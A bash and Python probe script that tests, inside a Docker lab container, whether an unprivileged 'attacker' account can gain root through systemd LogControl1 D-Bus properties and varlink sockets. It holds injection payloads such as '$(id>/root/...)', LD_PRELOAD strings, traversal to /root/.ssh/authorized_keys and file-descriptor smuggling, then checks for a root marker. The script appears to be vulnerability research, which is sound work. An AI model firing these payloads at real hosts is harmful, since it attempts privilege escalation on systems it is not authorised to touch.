#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/systemd-logcontrol-varlink-gap.out"

mkdir -p "$repo_dir/logs"
: >"$log_path"
exec > >(tee -a "$log_path") 2>&1

echo "systemd LogControl1 and varlink gap probe"
echo "target=$container"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$container" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $container" >&2
  exit 1
fi

docker exec -i "$container" bash -s <<'TARGET'
set +e
export LC_ALL=C

ROOT_MARKER=/root/systemd_logcontrol_varlink_gap_lpe
TMP_MARKER=/tmp/systemd_logcontrol_varlink_gap_lpe
FD_PROBE=/tmp/systemd_logcontrol_varlink_gap_fd_probe

rm -f "$ROOT_MARKER" "$TMP_MARKER" "$FD_PROBE" /root/systemd_logcontrol_varlink_gap_fd_probe

section() {
  printf '\n## %s\n' "$1"
}

run_cmd() {
  local label="$1"
  shift
  printf '\n### %s\n' "$label"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
  printf 'rc=%s\n' "$?"
}

as_attacker() {
  local label="$1"
  shift
  printf '\n### attacker: %s\n' "$label"
  runuser -u attacker -- "$@"
  printf 'rc=%s\n' "$?"
}

section "target identity, package, service proof"
uname -a
sed -n '1,12p' /etc/os-release
systemctl --version | head -1
id attacker
groups attacker
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n' \
  dbus dbus-daemon polkitd systemd systemd-sysv systemd-resolved systemd-timesyncd systemd-oomd 2>&1 | sort
systemctl is-enabled systemd-logind.service systemd-resolved.service systemd-timesyncd.service systemd-oomd.service 2>&1
systemctl is-active systemd-logind.service systemd-resolved.service systemd-timesyncd.service systemd-oomd.service 2>&1
systemctl show -p FragmentPath -p UnitFileState -p ActiveState -p SubState -p MainPID -p User -p BusName \
  -p ConditionResult -p Conditions -p ExecStart \
  systemd-logind.service systemd-resolved.service systemd-timesyncd.service systemd-oomd.service 2>&1

section "default D-Bus and socket reachability"
busctl --system list --no-pager | awk 'NR == 1 || /org\.freedesktop\.(systemd1|login1|resolve1|timesync1)/'
for svc in org.freedesktop.systemd1 org.freedesktop.login1 org.freedesktop.resolve1 org.freedesktop.timesync1; do
  printf '\n### bus tree %s\n' "$svc"
  timeout 12 busctl --system tree "$svc" --no-pager 2>&1 | sed -n '1,80p'
  printf 'rc=%s\n' "${PIPESTATUS[0]}"
done
find /run -xdev -type s -printf '%M %u:%g %p\n' 2>/dev/null | sort | grep -E '/run/(systemd|dbus|snapd|uuidd)' || true
for sock in \
  /run/systemd/io.systemd.ManagedOOM \
  /run/systemd/userdb/io.systemd.DynamicUser \
  /run/systemd/resolve/io.systemd.Resolve \
  /run/systemd/resolve/io.systemd.Resolve.Monitor \
  /run/systemd/io.systemd.sysext; do
  stat -Lc '%A %U:%G %s %n' "$sock" 2>&1
done

section "LogControl1 interface proof"
for svc in org.freedesktop.systemd1 org.freedesktop.login1 org.freedesktop.resolve1 org.freedesktop.timesync1; do
  printf '\n### LogControl1 introspect %s\n' "$svc"
  timeout 15 busctl --system introspect "$svc" /org/freedesktop/LogControl1 org.freedesktop.LogControl1 --no-pager 2>&1
  printf 'rc=%s\n' "$?"
  for prop in LogLevel LogTarget SyslogIdentifier; do
    printf 'root get %s.%s: ' "$svc" "$prop"
    timeout 5 busctl --system get-property "$svc" /org/freedesktop/LogControl1 org.freedesktop.LogControl1 "$prop" 2>&1
    printf 'rc=%s\n' "$?"
  done
done

section "attacker LogControl1 read and set probes"
runuser -u attacker -- bash -s <<'ATTACKER'
set +e
export LC_ALL=C
id
payload_values=(
  debug
  info
  warning
  journal
  console
  kmsg
  "file:/tmp/systemd_logcontrol_varlink_gap_lpe"
  "/root/systemd_logcontrol_varlink_gap_lpe"
  $'debug\n../../../root/.ssh/authorized_keys'
  'LD_PRELOAD=/tmp/systemd_logcontrol_varlink_gap.so'
  '../../../tmp/systemd_logcontrol_varlink_gap'
  '$(id>/root/systemd_logcontrol_varlink_gap_lpe)'
)
for svc in org.freedesktop.systemd1 org.freedesktop.login1 org.freedesktop.resolve1 org.freedesktop.timesync1; do
  printf '\n### service %s\n' "$svc"
  timeout 5 busctl --system get-property "$svc" /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogLevel 2>&1
  printf 'get_loglevel_rc=%s\n' "$?"
  timeout 5 busctl --system get-property "$svc" /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogTarget 2>&1
  printf 'get_logtarget_rc=%s\n' "$?"
  for value in "${payload_values[@]}"; do
    printf 'VALUE=%q\n' "$value"
    timeout 5 busctl --system set-property "$svc" /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogLevel s "$value" 2>&1
    printf 'set_loglevel_rc=%s\n' "$?"
    timeout 5 busctl --system set-property "$svc" /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogTarget s "$value" 2>&1
    printf 'set_logtarget_rc=%s\n' "$?"
  done
done
ATTACKER

section "varlink socket interface proof as attacker"
runuser -u attacker -- bash -s <<'ATTACKER'
set +e
export LC_ALL=C
id
for sock_iface in \
  "/run/systemd/io.systemd.ManagedOOM io.systemd.ManagedOOM" \
  "/run/systemd/io.systemd.ManagedOOM io.systemd.UserDatabase" \
  "/run/systemd/userdb/io.systemd.DynamicUser io.systemd.UserDatabase" \
  "/run/systemd/resolve/io.systemd.Resolve io.systemd.Resolve" \
  "/run/systemd/resolve/io.systemd.Resolve.Monitor io.systemd.Resolve" \
  "/run/systemd/io.systemd.sysext io.systemd.sysext"; do
  set -- $sock_iface
  sock="$1"
  iface="$2"
  printf '\n### socket %s interface %s\n' "$sock" "$iface"
  timeout 5 varlinkctl info "$sock" 2>&1
  printf 'info_rc=%s\n' "$?"
  timeout 5 varlinkctl introspect "$sock" "$iface" 2>&1 | sed -n '1,160p'
  printf 'introspect_rc=%s\n' "${PIPESTATUS[0]}"
done
ATTACKER

section "attacker varlink control/path/env/fd probes"
runuser -u attacker -- python3 - <<'PY'
import array
import json
import os
import socket

fd_probe = "/tmp/systemd_logcontrol_varlink_gap_fd_probe"
bad = "debug\n../../../root/.ssh/authorized_keys LD_PRELOAD=/tmp/x $(id>/root/systemd_logcontrol_varlink_gap_lpe)"

cases = [
    (
        "managedoom normal subscribe",
        "/run/systemd/io.systemd.ManagedOOM",
        {"method": "io.systemd.ManagedOOM.SubscribeManagedOOMCGroups", "parameters": {}},
        False,
    ),
    (
        "managedoom path/env/state confusion",
        "/run/systemd/io.systemd.ManagedOOM",
        {
            "method": "io.systemd.ManagedOOM.SubscribeManagedOOMCGroups",
            "parameters": {
                "path": "/root/systemd_logcontrol_varlink_gap_lpe",
                "mode": bad,
                "property": "ManagedOOMSwap",
                "limit": 1,
                "environment": ["LD_PRELOAD=/tmp/x", "SYSTEMD_LOG_LEVEL=debug"],
                "state": "reload",
            },
        },
        False,
    ),
    (
        "managedoom fd injection",
        "/run/systemd/io.systemd.ManagedOOM",
        {"method": "io.systemd.ManagedOOM.SubscribeManagedOOMCGroups", "parameters": {}},
        True,
    ),
    (
        "dynamic-user root lookup",
        "/run/systemd/userdb/io.systemd.DynamicUser",
        {"method": "io.systemd.UserDatabase.GetUserRecord", "parameters": {"uid": 0, "service": "io.systemd.DynamicUser"}},
        False,
    ),
    (
        "dynamic-user username control/path",
        "/run/systemd/userdb/io.systemd.DynamicUser",
        {"method": "io.systemd.UserDatabase.GetUserRecord", "parameters": {"userName": bad, "service": "io.systemd.DynamicUser"}},
        False,
    ),
    (
        "dynamic-user service confusion",
        "/run/systemd/userdb/io.systemd.DynamicUser",
        {"method": "io.systemd.UserDatabase.GetUserRecord", "parameters": {"uid": 0, "service": bad}},
        False,
    ),
    (
        "dynamic-user membership confusion",
        "/run/systemd/userdb/io.systemd.DynamicUser",
        {"method": "io.systemd.UserDatabase.GetMemberships", "parameters": {"userName": bad, "groupName": "root", "service": "io.systemd.DynamicUser"}},
        False,
    ),
    (
        "dynamic-user fd injection",
        "/run/systemd/userdb/io.systemd.DynamicUser",
        {"method": "io.systemd.UserDatabase.GetUserRecord", "parameters": {"uid": 0, "service": "io.systemd.DynamicUser"}},
        True,
    ),
    (
        "resolved normal hostname",
        "/run/systemd/resolve/io.systemd.Resolve",
        {"method": "io.systemd.Resolve.ResolveHostname", "parameters": {"ifindex": 0, "name": "localhost", "family": 2, "flags": 0}},
        False,
    ),
    (
        "resolved hostname control/path",
        "/run/systemd/resolve/io.systemd.Resolve",
        {"method": "io.systemd.Resolve.ResolveHostname", "parameters": {"ifindex": 0, "name": bad, "family": 2, "flags": 0}},
        False,
    ),
    (
        "resolved address normal",
        "/run/systemd/resolve/io.systemd.Resolve",
        {"method": "io.systemd.Resolve.ResolveAddress", "parameters": {"ifindex": 0, "family": 2, "address": [127, 0, 0, 1], "flags": 0}},
        False,
    ),
    (
        "resolved fd injection",
        "/run/systemd/resolve/io.systemd.Resolve",
        {"method": "io.systemd.Resolve.ResolveHostname", "parameters": {"ifindex": 0, "name": "localhost", "family": 2, "flags": 0}},
        True,
    ),
]

def call(label, sock_path, payload, send_fd):
    print(f"\n### {label}")
    print(f"sock={sock_path}")
    print("send=" + json.dumps(payload, sort_keys=True))
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect(sock_path)
        data = (json.dumps(payload, separators=(",", ":")) + "\0").encode()
        if send_fd:
            fd = os.open(fd_probe, os.O_CREAT | os.O_RDWR | os.O_TRUNC, 0o600)
            try:
                os.write(fd, b"attacker-fd-probe")
                os.lseek(fd, 0, os.SEEK_SET)
                fds = array.array("i", [fd])
                s.sendmsg([data], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, fds)])
            finally:
                os.close(fd)
        else:
            s.sendall(data)
        try:
            resp = s.recv(65536)
            print("recv=" + repr(resp[:4096]))
        except Exception as e:
            print(f"recv_error={type(e).__name__}: {e}")
    except Exception as e:
        print(f"connect_or_send_error={type(e).__name__}: {e}")
    finally:
        s.close()

for case in cases:
    call(*case)
PY

section "state transition and root proof checks"
for svc in org.freedesktop.systemd1 org.freedesktop.login1 org.freedesktop.resolve1 org.freedesktop.timesync1; do
  printf '\n### final LogControl properties %s\n' "$svc"
  timeout 5 busctl --system get-property "$svc" /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogLevel 2>&1
  printf 'loglevel_rc=%s\n' "$?"
  timeout 5 busctl --system get-property "$svc" /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogTarget 2>&1
  printf 'logtarget_rc=%s\n' "$?"
done
systemctl is-active systemd-logind.service systemd-resolved.service systemd-timesyncd.service systemd-oomd.service 2>&1
systemctl --failed --no-pager 2>&1
for path in "$ROOT_MARKER" "$TMP_MARKER" /root/systemd_logcontrol_varlink_gap_fd_probe "$FD_PROBE"; do
  stat -Lc '%A %U:%G %s %n' "$path" 2>&1 || true
done
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_PROOF_PRESENT"
  cat "$ROOT_MARKER" 2>&1
else
  echo "NO_ROOT_PROOF"
fi

section "cleanup"
rm -f "$TMP_MARKER" "$FD_PROBE"
stat -Lc '%A %U:%G %s %n' "$ROOT_MARKER" "$TMP_MARKER" "$FD_PROBE" 2>&1 || true
TARGET
